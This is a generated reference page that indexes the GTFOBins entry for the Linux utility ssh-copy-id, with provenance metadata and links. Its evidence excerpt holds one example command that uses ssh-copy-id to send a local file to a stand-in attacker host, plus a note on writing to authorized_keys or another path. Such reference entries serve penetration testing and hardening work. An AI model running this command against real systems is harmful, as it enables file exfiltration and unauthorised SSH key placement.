---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ssh-copy-id

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ssh-copy-id` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ssh-copy-id covering file-read, file-write.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ssh-copy-id.md)
- Source verification: [source record](../../sources/gtfobins/ssh-copy-id.md)

## Aliases

- `ssh-copy-id`

## Source Verification

[source record](../../sources/gtfobins/ssh-copy-id.md)

## Evidence Excerpt

```text
_body: ''
_name: ssh-copy-id
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id
functions:
file-read:
- code: ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
comment: The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise
the `-t /path/to/output-file` option can be used.
```
